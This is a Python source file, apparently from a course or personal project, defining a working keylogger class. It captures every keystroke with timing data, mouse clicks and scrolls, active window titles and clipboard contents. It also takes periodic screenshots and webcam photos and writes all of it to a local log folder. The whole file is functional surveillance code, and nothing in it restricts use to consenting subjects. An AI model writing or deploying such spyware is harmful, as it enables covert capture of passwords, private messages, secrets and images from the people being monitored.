import os, time, datetime, logging, threading, pyautogui, cv2, clipboard
import pygetwindow as gw
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener

class KeyloggerCore:
    def __init__(self, log_directory="D:/Delta/Level 4/Project/tools/backend/keylogger"):
        self.log_directory = log_directory
        self.log_file_name = "keylogger.txt"
        self.webcam_index = 0
        self.is_running = False
        self.keyboard_listener = None
        self.mouse_listener = None
        self.last_key_time = time.time()
        self.previous_window = None
        os.makedirs(self.log_directory, exist_ok=True)
        self.log_file_path = os.path.join(self.log_directory, self.log_file_name)
        open(self.log_file_path, 'w').close()
        self.keylogger_logger = logging.getLogger('keylogger')
        handler = logging.FileHandler(self.log_file_path)
        handler.setFormatter(logging.Formatter("%(asctime)s: %(message)s"))
        self.keylogger_logger.addHandler(handler)
        self.keylogger_logger.setLevel(logging.DEBUG)

    def get_active_window(self):
        try:
            return gw.getActiveWindowTitle()
        except:
            return "Unknown Window"

    def log_clipboard(self):
        try:
            content = clipboard.paste()
            if content and content.strip():
                self.keylogger_logger.info(f"[CLIPBOARD] {content}")
        except:
            pass

    def take_screenshot(self):
        try:
            img = pyautogui.screenshot()
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.log_directory, f"screenshot_{timestamp}.png")
            img.save(path)
            self.keylogger_logger.info(f"[SCREENSHOT] {path}")
            return path
        except:
            return None

    def capture_webcam(self):
        try:
            cap = cv2.VideoCapture(self.webcam_index)
            ret, frame = cap.read()
            if ret:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                path = os.path.join(self.log_directory, f"webcam_{timestamp}.jpg")
                cv2.imwrite(path, frame)
                self.keylogger_logger.info(f"[WEBCAM] {path}")
                cap.release()
                return path
            cap.release()
        except:
            pass
        return None

    def on_mouse_click(self, x, y, button, pressed):
        action = "Pressed" if pressed else "Released"
        self.keylogger_logger.info(f"[MOUSE] {action} {button} at ({x},{y})")

    def on_mouse_scroll(self, x, y, dx, dy):
        self.keylogger_logger.info(f"[MOUSE] Scroll ({dx},{dy}) at ({x},{y})")

    def log_timing(self, key):
        now = time.time()
        interval = round(now - self.last_key_time, 3)
        self.keylogger_logger.info(f"[TIMING] '{key}' after {interval}s")
        self.last_key_time = now

    def track_focus(self):
        while self.is_running:
            current_window = self.get_active_window()
            if current_window != self.previous_window:
                self.keylogger_logger.info(f"[WINDOW] {current_window}")
                self.previous_window = current_window
            time.sleep(2)

    def on_key_press(self, key):
        try:
            char = key.char
            self.log_timing(char)
            self.keylogger_logger.info(f"[KEY] {char}")
        except AttributeError:
            self.keylogger_logger.info(f"[KEY] {key}")

    def on_key_release(self, key):
        if str(key) == 'Key.esc':
            return False

    def start_keylogger(self):
        if self.is_running:
            return False
        self.is_running = True
        self.keylogger_logger.info("[KEYLOGGER] Started")
        self.keyboard_listener = KeyboardListener(on_press=self.on_key_press, on_release=self.on_key_release)
        self.keyboard_listener.start()
        self.mouse_listener = MouseListener(on_click=self.on_mouse_click, on_scroll=self.on_mouse_scroll)
        self.mouse_listener.start()
        threading.Thread(target=self.track_focus, daemon=True).start()
        return True

    def stop_keylogger(self):
        if not self.is_running:
            return False
        self.is_running = False
        self.keylogger_logger.info("[KEYLOGGER] Stopped")
        if self.keyboard_listener:
            self.keyboard_listener.stop()
        if self.mouse_listener:
            self.mouse_listener.stop()
        return True

    def run_periodic_tasks(self):
        if not self.is_running:
            return None, None, False
        self.log_clipboard()
        ss = self.take_screenshot()
        wc = self.capture_webcam()
        return ss, wc, True
